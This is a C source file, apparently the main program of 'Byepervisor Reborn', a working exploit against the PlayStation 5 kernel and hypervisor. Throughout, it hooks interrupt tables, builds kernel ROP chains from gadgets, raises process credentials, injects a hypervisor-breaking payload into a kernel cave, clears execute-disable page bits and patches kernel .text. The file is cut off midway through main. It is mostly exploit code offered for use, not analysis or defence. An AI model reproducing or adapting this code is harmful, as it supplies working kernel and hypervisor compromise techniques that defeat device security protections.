#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>
#if !defined(PHASE3_RELEASE) || !defined(PHASE3_CARRIER)
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/socket.h>
#endif


#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#if defined(PHASE1_CARRIER)
#include "phase1_allocator1060.h"
#elif defined(PHASE2_CARRIER)
#include "phase2_router1060.h"
#endif
#include "khook.h"
#include "hv_1060.h"
#include "util.h"
#include "paging.h"
#include "runtime_exec1060.h"

#include "break_hv_payload/break_hv.h"

#define STATE_ARMED               0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL                0xCAFE133741414141ULL
#define HOOK_CORE                 0
#define HOOK_IST                  6
#define CAVE_STATE_OFF            0x600
#define CAVE_SAVE_OFF             0x620
#define TSS_STRIDE                0x68
#define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000

#define HV_LOADER_PA_REGULAR      0x062800000
#define HV_LOADER_PA_PRO          0x8e0800000
// Linux loader's 10.60 IDT offset is relative to kernel .text.
#define FW_1060_RETAIL             (g_fw1060_profile.firmware)
#define FW_1060_IDT_OFFSET         0x3A1C300ULL
#define FW_1060_TSS_OFFSET         0x3A1EFE0ULL
#define FW_1060_TEXT_DATA_DISTANCE 0xCC0000ULL
#if !defined(PHASE3_RELEASE) || !defined(PHASE3_CARRIER)
#define FW_1060_RESULT_PORT       9633
#endif
#if defined(PHASE1_CARRIER)
#define FW_1060_CARRIER_PHASE " phase=1"
#elif defined(PHASE3_CARRIER)
#define FW_1060_CARRIER_PHASE " phase=3"
#elif defined(PHASE2_CARRIER)
#define FW_1060_CARRIER_PHASE " phase=2"
#else
#define FW_1060_CARRIER_PHASE ""
#endif




uint64_t g_hv_base_pa;

static int install_test_hook(int core_id, uint64_t cave)
{
  khook_t    hook;
  kh_chain_t chain;
  uint8_t    chain_buf[0x400];
  int        ret;

  printf("[+] install_test_hook addr = %p\n", &install_test_hook);

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  // kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB);    // 8b4008             mov     eax, dword [rax+0x8]
  // kh_set_resume_rax(&hook, ktext(0x12F61C6));
  // kh_set_resume_skip(&hook, 3);
  // kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB + 3); // skip ^^^

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);       // 48898708040000     mov     qword [rdi+0x408], rax
  kh_set_resume_rax(&hook, 0x12345678);
  //kh_set_resume_skip(&hook, 7);
  //kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE + 7); // skip ^^^

  uint64_t oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
{
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t set_rsi;
  uint64_t oracle;
  int ret;

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  set_rsi = kdldmap(STARTUP_MP_PAYLOAD_PAGE); // our payload
  // set_rsi = ktext(0x269FB8); // original vector (13.60)

  printf("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n", kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL), ktext(0), set_rsi);
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, set_rsi);
  kh_set_resume_rdx(&hook, cr3);

  oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, cr3);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00), kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);

  // carveout addr
  if (g_hv_base_pa == HV_LOADER_PA_PRO)
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
  else
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);
  
  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static void uninstall_hook(int core_id, uint64_t cave)
{
  khook_t hook;
  kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.saved_gate_lo = kread64(cave + CAVE_SAVE_OFF + 0x00);
  hook.saved_gate_hi = kread64(cave + CAVE_SAVE_OFF + 0x08);
  hook.saved_ist     = kread64(cave + CAVE_SAVE_OFF + 0x10);
  hook.installed     = 1;
  kh_disarm(&hook);
  kh_restore(&hook);
  kwrite64(cave + CAVE_STATE_OFF, 0);
}


int send_1060_result(const char *result)
{
#if defined(PHASE3_RELEASE) && defined(PHASE3_CARRIER)
  /*
   * The release Phase 3 carrier is unattended.  Keep the shared symbol for
   * non-reporting carrier code, but report that no transport exists rather
   * than pretending a host collected the result.
   */
  (void)result;
  return -1;
#else
  struct sockaddr_in address = {
    .sin_family = AF_INET,
    .sin_port = htons(FW_1060_RESULT_PORT),
    .sin_addr.s_addr = htonl(INADDR_ANY),
  };
  struct timeval deadline = { .tv_sec = 30 };
  fd_set readers;
  int listener = socket(AF_INET, SOCK_STREAM, 0);
  if (listener < 0)
    return -1;
  int reuse = 1;
  if (setsockopt(listener, SOL_SOCKET, SO_REUSEADDR,
                 &reuse, sizeof(reuse)) != 0) {
    close(listener);
    return -1;
  }
  if (bind(listener, (struct sockaddr *)&address, sizeof(address)) != 0 ||
      listen(listener, 1) != 0) {
    close(listener);
    return -1;
  }
  FD_ZERO(&readers);
  FD_SET(listener, &readers);
  if (select(listener + 1, &readers, NULL, NULL, &deadline) != 1) {
    close(listener);
    return -1;
  }
  int client = accept(listener, NULL, NULL);
  close(listener);
  if (client < 0)
    return -1;
  size_t length = strlen(result);
  ssize_t sent = send(client, result, length, 0);
  close(client);
  return sent == (ssize_t)length ? 0 : -1;
#endif
}
#ifdef BYEPERVISOR_1060_RECOVER
static int recover_1060_ists(void)
{
  const uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  const uint64_t tss = kdlsym(KERNEL_SYM_COMMON_TSS);
  const uint64_t db = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16;
  const uint64_t armed = 0x493950524f444152ULL;
  uint64_t state = 0, gate[2] = {0}, saved_gate[2] = {0};
  uint64_t old_ist[16] = {0}, saved_ist[16] = {0}, zero = 0;
  int status = 0, installed = 0, restored = 0;
  char message[160];

  if (kernel_get_fw_version() != FW_1060_RETAIL || !cave || !tss ||
      kernel_copyout(cave + 0x3000, &state, sizeof(state)) ||
      kernel_copyout(db, gate, sizeof(gate)) ||
      kernel_copyout(cave + 0x3008, saved_gate, sizeof(saved_gate)) ||
      kernel_copyout(cave + 0x3018, saved_ist, sizeof(saved_ist)))
    status = 1;
  else if (state != armed)
    status = 2;
  else if (gate[0] != saved_gate[0] || gate[1] != saved_gate[1] ||
           ((gate[0] >> 32) & 7) != 4)
    status = 3;

  for (int cpu = 0; status == 0 && cpu < 16; ++cpu) {
    uint64_t slot = tss + (uint64_t)cpu * TSS_STRIDE + 0x4c;
    uint64_t expected = cpu == 0 ? cave + 0x240 :
                        cave + 0x1400 + (uint64_t)(cpu - 1) * 0x100 + 0x50;
    if (kernel_copyout(slot, &old_ist[cpu], sizeof(uint64_t)) ||
        saved_ist[cpu] != 0 ||
        (old_ist[cpu] && old_ist[cpu] != expected &&
         !(cpu == 0 && old_ist[cpu] == cave + 0x40)))
      status = 4;
    if (old_ist[cpu])
      ++installed;
  }
  if (status == 0) {
    for (int cpu = 0; cpu < 16; ++cpu) {
      uint64_t slot = tss + (uint64_t)cpu * TSS_STRIDE + 0x4c;
      if (kernel_copyin(&zero, slot, sizeof(zero)) != 0)
        status = 5;
    }
    for (int cpu = 0; cpu < 16; ++cpu) {
      uint64_t value = ~0ULL;
      uint64_t slot = tss + (uint64_t)cpu * TSS_STRIDE + 0x4c;
      if (kernel_copyout(slot, &value, sizeof(value)) != 0 || value)
        status = 5;
      else
        ++restored;
    }
    if (status == 0 &&
        (kernel_copyin(&zero, cave + 0x3000, sizeof(zero)) != 0 ||
         kernel_copyout(cave + 0x3000, &state, sizeof(state)) != 0 || state))
      status = 6;
  }
  snprintf(message, sizeof(message),
           "BYEPERVISOR_1060_RECOVER status=%d before=%d restored=%d state=%016lx\n",
           status, installed, restored, state);
  printf("%s", message);
  notifyf("10.60 cleanup status=%d restored=%d/16", status, restored);
  send_1060_result(message);
  return status == 0 ? 0 : -1;
}
#endif


static int smoke_1060_data_read(int report_to_host)
{
  const uint64_t idt = KERNEL_ADDRESS_DATA_BASE +
                       FW_1060_IDT_OFFSET - FW_1060_TEXT_DATA_DISTANCE;
  uint32_t firmware = kernel_get_fw_version();
  uint64_t gate = 0;
  uint64_t proc0 = 0, vmspace = 0, pmap = 0, pml4 = 0, cr3 = 0, dmap = 0;
  uint64_t db_gate[2] = {0}, rsp0[16] = {0}, db_stack[16] = {0};
  uint64_t ist6 = 0, db_handler = 0, cave_state = 0;
  int db_ist = 0, bad_cpu = -1;
  int soc_id = 0, cpu_id = -1;
  char result[360];
  int status = 0;

  if (fw1060_profile_validate() != 0 ||
      firmware != FW_1060_RETAIL || !KERNEL_ADDRESS_DATA_BASE)
    status = 1;
  else if (kernel_copyout(idt, &gate, sizeof(gate)) != 0)
    status = 2;
  else if (((gate >> 40) & 0xff) != 0x8e)
    status = 3;
  if (firmware == FW_1060_RETAIL)
    kernel_copyout(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x3000,
                   &cave_state, sizeof(cave_state));
  if (status == 0) {
    proc0 = kernel_get_proc(0);
    if (!proc0 ||
        kernel_copyout(proc0 + KERNEL_OFFSET_PROC_P_VMSPACE, &vmspace,
                       sizeof(vmspace)) != 0 ||
        !vmspace ||
        kernel_copyout(vmspace + 0x1d8, &pmap, sizeof(pmap)) != 0 ||
        !pmap ||
        kernel_copyout(pmap + 0x20, &pml4, sizeof(pml4)) != 0 ||
        kernel_copyout(pmap + 0x28, &cr3, sizeof(cr3)) != 0 ||
        !pml4 || !cr3 || (cr3 & 0xfff) || cr3 >= 0x1000000000ULL ||
        (pml4 >> 48) != 0xffff || ((pml4 - cr3) & 0x3fff)) {
      status = 4;
    } else {
      dmap = pml4 - cr3;
    }
  }
  if (status == 0) {
    kdset_dmap_1060(dmap);
    if (kdldmap(cr3) != pml4 ||
        kdlsym(KERNEL_SYM_IDT_ARRAY) != idt ||
        kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) !=
            KERNEL_ADDRESS_DATA_BASE + 0xC12FD0 - FW_1060_TEXT_DATA_DISTANCE)
      status = 5;
  }
  if (status == 0) {
    const uint64_t tss = kdlsym(KERNEL_SYM_COMMON_TSS);
    const uint64_t db = idt + 16;
    if (tss != KERNEL_ADDRESS_DATA_BASE + FW_1060_TSS_OFFSET -
                   FW_1060_TEXT_DATA_DISTANCE ||
        kernel_copyout(db, db_gate, sizeof(db_gate)) != 0)
      status = 6;
    else {
      db_ist = (db_gate[0] >> 32) & 7;
      db_handler = (db_gate[0] & 0xffff) |
                   (((db_gate[0] >> 48) & 0xffff) << 16) |
                   ((db_gate[1] & 0xffffffff) << 32);
      if (!(db_gate[0] & (1ULL << 47)) || db_ist < 1 ||
          db_handler < ktext(0) || db_handler >= KERNEL_ADDRESS_DATA_BASE ||
          db_gate[1] != (kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET) >> 32))
        status = 6;
    }
    for (int cpu = 0; status == 0;
         ++cpu) {
      if ((uint32_t)cpu >= g_fw1060_profile.cpu_count)
        break;
      const uint64_t slot = tss + (uint64_t)cpu * TSS_STRIDE;
      if (kernel_copyout(slot + 4, &rsp0[cpu], sizeof(uint64_t)) != 0 ||
          kernel_copyout(slot + 0x24 + (db_ist - 1) * 8,
                         &db_stack[cpu], sizeof(uint64_t)) != 0 ||
          kernel_copyout(slot + 0x4c, &ist6, sizeof(ist6)) != 0 ||
          (rsp0[cpu] >> 47) != 0x1ffff || !db_stack[cpu] || ist6) {
        bad_cpu = cpu;
        status = 7;
        break;
      }
      for (int earlier = 0; earlier < cpu; ++earlier) {
        if (rsp0[cpu] == rsp0[earlier] ||
            db_stack[cpu] == db_stack[earlier]) {
          bad_cpu = cpu;
          status = 7;
          break;
        }
      }
    }
  }
  if (status == 0) {
    soc_id = sceKernelGetMainSocId();
    cpu_id = get_cpu_core();
    if (fw1060_identity_validate(firmware, (uint32_t)soc_id,
                                 g_fw1060_profile.cpu_count) != 0)
      status = 8;
  }

  snprintf(result, sizeof(result),
           "BYEPERVISOR_1060_READ status=%d fw=%08x data=%016lx idt=%016lx gate=%016lx pmap=%016lx cr3=%016lx dmap=%016lx db=%016lx ist=%d ist6=%016lx badcpu=%d soc=%08x cpu=%d state=%016lx\n",
           status, firmware, KERNEL_ADDRESS_DATA_BASE, idt, gate, pmap, cr3,
           dmap, db_handler, db_ist, ist6, bad_cpu, soc_id, cpu_id, cave_state);
  printf("%s", result);
  if (status == 0)
    notifyf(report_to_host ? "Byepervisor Reborn 10.60 read-only preflight\nIDT[0]: 0x%016lx" :
                             "Byepervisor Reborn 10.60 preflight passed\nIDT[0]: 0x%016lx", gate);
  if (report_to_host && send_1060_result(result) != 0)
    return -1;
  return status == 0 ? 0 : -1;
}
#ifdef BYEPERVISOR_1060_ARM
static int verify_1060_reserved_bytes(runtime_exec1060_page_t *page)
{
  uint8_t thunk[FW1060_CFI_BYTES_MAX];
  uint8_t landing[FW1060_LANDING_BYTES];
  for (size_t i = 0; i < FW1060_CFI_PAIR_COUNT; ++i) {
    const fw1060_cfi_pair_t *pair = &g_fw1060_profile.cfi_pairs[i];
    const uint64_t addresses[2] = {
      KERNEL_ADDRESS_TEXT_BASE + pair->thunk_offset,
      KERNEL_ADDRESS_TEXT_BASE + pair->landing_offset,
    };
    const uint8_t *expected[2] = {pair->thunk_bytes, pair->landing_bytes};
    uint8_t *actual[2] = {thunk, landing};
    const size_t sizes[2] = {pair->thunk_size, sizeof(landing)};
    for (size_t side = 0; side < 2; ++side) {
      if (kernel_copyout(addresses[side], actual[side], sizes[side]) != 0) {
        page->preparation_address = addresses[side];
        memcpy(&page->preparation_expected, expected[side],
               sizeof(page->preparation_expected));
        page->preparation_readback = UINT64_MAX;
        return -1;
      }
      for (size_t offset = 0; offset < sizes[side];
           offset += sizeof(uint64_t)) {
        uint64_t expected_qword = 0, actual_qword = 0;
        memcpy(&expected_qword, expected[side] + offset, sizeof(uint64_t));
        memcpy(&actual_qword, actual[side] + offset, sizeof(uint64_t));
        if (expected_qword != actual_qword) {
          page->preparation_address = addresses[side] + offset;
          page->preparation_expected = expected_qword;
          page->preparation_readback = actual_qword;
          return -1;
        }
      }
    }
    if (fw1060_verify_cfi_pair(pair, thunk, landing) != 0)
      return -1;
  }
  return 0;
}


static int run_1060_carrier(void)
{
  hv1060_result_diag_t diagnostic = {0};
  int result = hv1060_run();
  runtime_exec1060_page_t page = {0};
  uint64_t current_pte = 0, verified_state = 0;
  char message[1024];
#ifdef PHASE1_CARRIER
  phase1_prealloc_record_t prealloc = {0}, prealloc_readback = {0};
  const uint64_t malloc_type =
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_type_offset;
  const uint32_t malloc_flags =
      g_fw1060_profile.malloc_nowait | g_fw1060_profile.malloc_zero;
#endif
#ifdef PHASE2_CARRIER
  phase2_prealloc_record_t phase2_prealloc = {0}, phase2_readback = {0};
  const uint64_t phase2_malloc_type =
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_type_offset;
  const uint32_t phase2_malloc_flags =
      g_fw1060_profile.malloc_nowait | g_fw1060_profile.malloc_zero;
#endif
  hv1060_get_result_diag(&diagnostic);
  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  if (cave)
    kernel_copyout(cave + RUNTIME_EXEC1060_CAVE_OFFSET, &page, sizeof(page));
  if (page.magic == RUNTIME_EXEC1060_MAGIC && page.pte_address)
    kernel_copyout(page.pte_address, &current_pte, sizeof(current_pte));
  if (result == 0) {
    if (!cave || page.magic != RUNTIME_EXEC1060_MAGIC ||
        !runtime_exec1060_pte_invariant_equal(page.pte_value, current_pte)) {
      result = -20;
    } else if (verify_1060_reserved_bytes(&page) != 0) {
      page.preparation_state = RUNTIME_EXEC1060_PREP_BYTES_FAILED;
      kernel_copyin(&page, cave + RUNTIME_EXEC1060_CAVE_OFFSET, sizeof(page));
      result = -22;
#ifdef PHASE1_CARRIER
    } else if (kernel_copyout(cave + PHASE1_PREALLOC_OFFSET, &prealloc,
                              sizeof(prealloc)) ||
               phase1_prealloc_fired_validate(&prealloc, malloc_type,
                                               malloc_flags)) {
      result = -23;
    } else {
      prealloc.state = PHASE1_PREALLOC_STATE_VERIFIED;
      prealloc.result_checksum = phase1_prealloc_result_checksum(&prealloc);
      if (kernel_copyin(&prealloc, cave + PHASE1_PREALLOC_OFFSET,
                        sizeof(prealloc)) ||
          kernel_copyout(cave + PHASE1_PREALLOC_OFFSET, &prealloc_readback,
                         sizeof(prealloc_readback)) ||
          memcmp(&prealloc, &prealloc_readback, sizeof(prealloc)) ||
          phase1_prealloc_validate(&prealloc_readback, malloc_type,
                                   malloc_flags)) {
        result = -24;
      } else {
        page.post_resume_state = RUNTIME_EXEC1060_POST_RESUME_VERIFIED;
        if (kernel_copyin(&page.post_resume_state,
                          cave + RUNTIME_EXEC1060_CAVE_OFFSET +
                          offsetof(runtime_exec1060_page_t, post_resume_state),
                          sizeof(page.post_resume_state)) != 0 ||
            kernel_copyout(cave + RUNTIME_EXEC1060_CAVE_OFFSET +
                           offsetof(runtime_exec1060_page_t,
                                    post_resume_state),
                           &verified_state, sizeof(verified_state)) != 0 ||
            verified_state != RUNTIME_EXEC1060_POST_RESUME_VERIFIED)
          result = -21;
      }
#elif defined(PHASE2_CARRIER)
    } else if (kernel_copyout(cave + PHASE2_PREALLOC_OFFSET,
                              &phase2_prealloc,
                              sizeof(phase2_prealloc)) ||
               phase2_prealloc_fired_validate(&phase2_prealloc,
                                               phase2_malloc_type,
                                               phase2_malloc_flags) ||
               phase2_leaf_contract_safe(&phase2_prealloc)) {
      result = -25;
    } else {
      phase2_prealloc.state = PHASE2_PREALLOC_VERIFIED;
      phase2_prealloc.result_checksum =
          phase2_prealloc_result_checksum(&phase2_prealloc);
      if (kernel_copyin(&phase2_prealloc, cave + PHASE2_PREALLOC_OFFSET,
                        sizeof(phase2_prealloc)) ||
          kernel_copyout(cave + PHASE2_PREALLOC_OFFSET, &phase2_readback,
                         sizeof(phase2_readback)) ||
          memcmp(&phase2_prealloc, &phase2_readback,
                 sizeof(phase2_prealloc)) ||
          phase2_prealloc_validate(&phase2_readback, phase2_malloc_type,
                                   phase2_malloc_flags)) {
        result = -26;
      } else {
        page.post_resume_state = RUNTIME_EXEC1060_POST_RESUME_VERIFIED;
        if (kernel_copyin(&page.post_resume_state,
                          cave + RUNTIME_EXEC1060_CAVE_OFFSET +
                          offsetof(runtime_exec1060_page_t, post_resume_state),
                          sizeof(page.post_resume_state)) != 0 ||
            kernel_copyout(cave + RUNTIME_EXEC1060_CAVE_OFFSET +
                           offsetof(runtime_exec1060_page_t,
                                    post_resume_state),
                           &verified_state, sizeof(verified_state)) != 0 ||
            verified_state != RUNTIME_EXEC1060_POST_RESUME_VERIFIED)
          result = -21;
      }
#else
    } else {
      page.post_resume_state = RUNTIME_EXEC1060_POST_RESUME_VERIFIED;
      if (kernel_copyin(&page.post_resume_state,
                        cave + RUNTIME_EXEC1060_CAVE_OFFSET +
                        offsetof(runtime_exec1060_page_t, post_resume_state),
                        sizeof(page.post_resume_state)) != 0 ||
          kernel_copyout(cave + RUNTIME_EXEC1060_CAVE_OFFSET +
                         offsetof(runtime_exec1060_page_t, post_resume_state),
                         &verified_state, sizeof(verified_state)) != 0 ||
          verified_state != RUNTIME_EXEC1060_POST_RESUME_VERIFIED)
        result = -21;
#endif
    }
  }
#ifdef PHASE1_CARRIER
  if (cave)
    kernel_copyout(cave + PHASE1_PREALLOC_OFFSET, &prealloc_readback,
                   sizeof(prealloc_readback));
#endif
#ifdef PHASE2_CARRIER
  if (cave)
    kernel_copyout(cave + PHASE2_PREALLOC_OFFSET, &phase2_readback,
                   sizeof(phase2_readback));
#endif
  snprintf(message, sizeof(message),
           "BYEPERVISOR_1060_ARM result=%d" FW_1060_CARRIER_PHASE
           " exec_page=%016lx "
           "pte_addr=%016lx armed_pte=%016lx current_pte=%016lx "
           "verified=%016lx prep=%016lx prep_addr=%016lx "
           "prep_expected=%016lx prep_readback=%016lx "
           "diag=%u or0=%016lx or1=%016lx or5=%016lx or6=%016lx "
           "or7=%016lx d0=%016lx d2=%016lx d3=%016lx d5=%016lx "
           "d6=%016lx gate=%016lx/%016lx"
#ifdef PHASE1_CARRIER
           " pre_state=%08x pre_addr=%016lx/%016lx/%016lx pre_sum=%016lx"
#endif
#ifdef PHASE2_CARRIER
           " p2_state=%08x p2_addr=%016lx/%016lx/%016lx "
           "p2_leaf=%016lx/%016lx/%016lx p2_sum=%016lx "
           "p2_diag=%016lx/%016lx"
#endif
           "\n",
           result, page.address, page.pte_address, page.pte_value, current_pte,
           verified_state, page.preparation_state, page.preparation_address,
           page.preparation_expected, page.preparation_readback,
           diagnostic.valid, diagnostic.oracle[0], diagnostic.oracle[1],
           diagnostic.oracle[5], diagnostic.oracle[6], diagnostic.oracle[7],
           diagnostic.detail[0], diagnostic.detail[2], diagnostic.detail[3],
           diagnostic.detail[5], diagnostic.detail[6],
           diagnostic.gate[0], diagnostic.gate[1]
#ifdef PHASE1_CARRIER
           , prealloc_readback.state, prealloc_readback.addresses[0],
           prealloc_readback.addresses[1], prealloc_readback.addresses[2],
           prealloc_readback.result_checksum
#endif
#ifdef PHASE2_CARRIER
           , phase2_readback.state, phase2_readback.addresses[0],
           phase2_readback.addresses[1], phase2_readback.addresses[2],
           phase2_readback.code_leaf_address,
           phase2_readback.data_leaf_address,
           phase2_readback.clone_leaf_address[0],
           phase2_readback.result_checksum,
           phase2_readback.diagnostic_stage,
           phase2_readback.diagnostic_detail
#endif
           );
  printf("%s", message);
#if !defined(PHASE3_RELEASE) || !defined(PHASE3_CARRIER)
  if (send_1060_result(message) != 0)
    printf("10.60 result listener was not collected\n");
#endif
  if (result == 0)
    for (;;)
      sceKernelSleep(1);
  return result;
}
#endif


int main(void)
{
  uint64_t test_val;
  uint8_t *test_val_bytes;

  uint32_t fw;
  uint64_t cave;
  uint64_t oracle;
  uint64_t kernel_pmap;
  uint64_t kernel_pm_cr3;
  uint64_t pml4e_addr;
  uint64_t pdpe_addr;
  uint64_t pte_addr;
  uint64_t pde_addr;
  uint64_t pml4e;
  uint64_t pdpe;
  uint64_t pde;
  uint64_t pte;
  uint64_t o;

  printf("[+] Byepervisor reborn v1\n");

  // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
  fw = kernel_get_fw_version();
  printf("[+] Detected firmware: %x.%x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);
  if ((fw & 0xffff0000) == 0x10600000) {
#ifdef BYEPERVISOR_1060_RECOVER
    return recover_1060_ists();
#else
#ifdef BYEPERVISOR_1060_ARM
    uint64_t armed_state;
    if (kernel_copyout(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x3000,
                       &armed_state, sizeof(armed_state)) == 0 &&
        armed_state == 0x493950524f444152ULL)
      return run_1060_carrier();
    int status = smoke_1060_data_read(0);
    return status ? status : run_1060_carrier();
#else
    return smoke_1060_data_read(1);
#endif
#endif
  }


  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
    printf("[!] Undetected firmware, exiting!\n");
    notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
    return -1;
  }

  // The hypervisor loader's base physical address changes depending on if its a regular or a pro unit
  int soc_id = sceKernelGetMainSocId();
  if (soc_id == 0x840fd0) {
    g_hv_base_pa = HV_LOADER_PA_PRO;
    printf("[+] Pro model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected pro model (0x%x)\n", soc_id);
  } else {
    g_hv_base_pa = HV_LOADER_PA_REGULAR;
    printf("[+] Regular model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected regular model (0x%x)\n", soc_id);
  }

  // We need system ucred to pin to core 0
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
  oracle = cave + KH_OFF_USER;

  pin_to_core(HOOK_CORE);

  // This is so we can send the same payload after resume to experiment with post-HV hax (or not if we want to debug the resume payload)
#define DEBUG_MP_STARTUP_PAYLOAD 0
#if DEBUG_MP_STARTUP_PAYLOAD == 0
  if (kread64(oracle) != 0) {
    printf("Hypervisor is already compromised\n");
    printf("Here's a dump of kernel .text base (xotext defeated)!\n");
    kHexDump(ktext(0), 0x60);

    printf("Here's a dump of some HV strings (hvcore+0x19830)!\n");
    kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);

    kwrite64(ktext(8), 0x41414141);

    printf("Edited kernel .text\n");
    kHexDump(ktext(0), 0x60);

    test_val = kread64(ktext(0));
    test_val_bytes = (uint8_t *) &test_val;
    notifyf("Byepervisor - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

    return 0;
  }
#endif

#if defined(KHOOK_TEST)
  int ret;

  ret = install_test_hook(HOOK_CORE, cave);
  printf("installed test khook = %d\n", ret);

  printf("1\n");
  sceKernelSleep(1);

  kwrite64(oracle, 0);
  printf("2\n");
  sceKernelSleep(1);

  pin_to_core(HOOK_CORE);
  printf("core = %d\n", get_cpu_core());

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);
  kwrite64(oracle, 0);
  sceKernelSleep(1);

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);

  sceKernelSleep(1);

  uninstall_hook(HOOK_CORE, cave);
  notifyf("uninstalled test khook\n");
  return 0;

#else // !KHOOK_TEST

  // Copy our payload that runs from startup_mp into kernel cave
  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);

  // Make the physical region executable in guest page tables
  kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
  kernel_pm_cr3 = kread64(kernel_pmap + 0x28);

  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
  kwrite64(pml4e_addr, pml4e);

